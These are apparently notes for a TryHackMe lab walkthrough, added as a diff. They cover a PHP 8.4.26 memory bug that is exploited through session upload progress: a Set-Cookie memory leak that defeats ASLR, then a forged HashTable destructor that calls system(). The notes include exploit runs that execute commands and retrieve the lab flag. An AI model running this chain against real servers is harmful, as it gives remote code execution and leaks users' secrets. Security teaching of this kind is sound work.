@@ -1,0 +1,109 @@
+PHP_SESSION_UPLOAD_PROGRESS works without auth etc before application code even runs
+php bailout when going over memory limit leaves dangling pointer that leads to RCE
+
+
+RECON
+┌──(kali㉿kali)-[~]
+└─$ ssh ubuntu@10.113.148.152                                     
+
+ubuntu@tryhackme-2404:~$ docker ps 
+CONTAINER ID   IMAGE               COMMAND                  CREATED        STATUS          PORTS                    NAMES
+d77a04da7d60   php:8.4.26-apache   "docker-php-entrypoi…"   23 hours ago   Up 11 minutes   127.0.0.1:8088->80/tcp   php2shell-target
+ubuntu@tryhackme-2404:~$ docker exec php2shell-target php -v
+PHP 8.4.26 (cli) (built: Oct 21 2026 00:31:19) (NTS)
+Copyright (c) The PHP Group
+Built by https://github.com/docker-library/php
+Zend Engine v4.4.26, Copyright (c) Zend Technologies
+    with Zend OPcache v8.4.26, Copyright (c), by Zend Technologies
+
+--8.4.26 short of fix 8.4.27
+
+
+ubuntu@tryhackme-2404:~$ curl -s http://127.0.0.1:8088/index.php
+OK
+ubuntu@tryhackme-2404:~$ docker exec php2shell-target cat /var/www/html/index.php
+<?php echo "OK\n"; ?>
+The entire application is one line that prints 
+OK
+
+There is no login form, no file upload, no database, and certainly no bug in this code to exploit. That is the point worth pausing on: if the attack works against this page, it works against the runtime, not the application, and a real target such as a WordPress or Laravel site is no better protected simply because its own code is sound.
+
+
+The server runs the ordinary prefork 
+mod_php
+ setup with 
+session.upload_progress
+ enabled as it is by default. For the lab it is cut down to a single worker, and 
+memory_limit
+ is set low, so the dangling pointer is reliably reused and the out-of-memory condition is easy to provoke; a production host would run many workers with a higher limit, which makes the timing harder to hit but not impossible. The exploit you will use is already on the machine:
+ubuntu@tryhackme-2404:~$ ls ~/php2shell-bypass-aslr-exp/
+docker  exploit.py  out  README.md  readme_en.md  src  tools
+
+
+LEAKING MEMORY AND DEFEATING  ADDRESS SPACE LAYOUT RANDOMISATION (ASLR)
+
+The mechanism reuses the bailout from the previous task. An out-of-memory condition is provoked while a session identifier is being handled, which leaves a stale pointer to the session id. A following request reoccupies that freed space so the stale pointer now describes a string whose length the attacker has inflated far beyond the real data. When PHP sends the session cookie, it reads that oversized session-id string and returns it to the client in the Set-Cookie: PHPSESSID response header. The header now carries whatever happened to sit in the worker's memory after the string, which the research measured at up to roughly 67 KB of process memory per request. In a real deployment that memory can hold other users' passwords, session cookies, API keys, and even TLS private keys; for the exploit, it holds the addresses it needs.
+
+The exploit runs this leak twice. The first pass discloses the base address of PHP's memory heap, and the second discloses the base address of the PHP library (
+libphp
+) by reading a pointer whose offset into the library is known. Between them, the two leaks tell the attacker exactly where the heap and the engine's own code live in this specific worker, which is all that was missing to defeat ASLR. You can watch both leaks happen by running the exploit; they are the first thing it does, and the same run then goes on to the code-execution step you will complete in the next task.
+
+ubuntu@tryhackme-2404:~/php2shell-bypass-aslr-exp$ python3 exploit.py -u http://127.0.0.1:8088/index.php
+[*] target http://127.0.0.1:8088/index.php (cmd='id>/out/p1')
+[*] offsets loaded from /home/ubuntu/php2shell-bypass-aslr-exp/out/offsets.env
+[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x702601200000
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x702602df7000
+[*] rotating worker over HTTP
+[*] stage 3: HTDATA=0x7026012690d8 ZIF=0x70260325c370
+[+] W3 attempt 1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+TO SHELL
+
+When PHP destroys a value, it may call a function pointer stored alongside it, a destructor, to release the value's resources. The exploit reoccupies the dangling reference with a forged internal structure (a 
+HashTable
+) whose destructor pointer, 
+pDestructor
+, has been set to the address of 
+system()
+ inside the PHP library, an address the leak in the previous task made known. When the engine tidies up that value at the end of request handling, it believes it is calling a harmless destructor and instead calls 
+system()
+ with attacker-controlled bytes as its argument. The command runs as the web server user. Nothing in the attack needs the C library or any gadget outside PHP itself; the whole finish is built from the engine's own code.
+ 
+ 1 rotate (crash worker, fork fresh one),
+ 2 leak heap(Set-Cookie, read heap chunk base),
+ 3 leak libphp(defeat ASLR),
+ 4 Forge(fake hashtable pDestructor points to system)
+ -> Code execution
+ 
+ 
+ ubuntu@tryhackme-2404:~/php2shell-bypass-aslr-exp$ python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'cat /f>/out/p1'
+[*] target http://127.0.0.1:8088/index.php (cmd='cat /f>/out/p1')
+[*] offsets loaded from /home/ubuntu/php2shell-bypass-aslr-exp/out/offsets.env
+[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x702601200000
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x702602df7000
+[*] rotating worker over HTTP
+[*] stage 3: HTDATA=0x7026012690d8 ZIF=0x70260325c370
+[+] W3 attempt 1
+PROOF: THM{bfhjdsfbjkdsfbnsk}
+
+
+
+
+FIX VERSIONS
+8.5.12, 8.4.27, 8.3.36 or 8.2.35
+ 
+ 
+ 
+
+
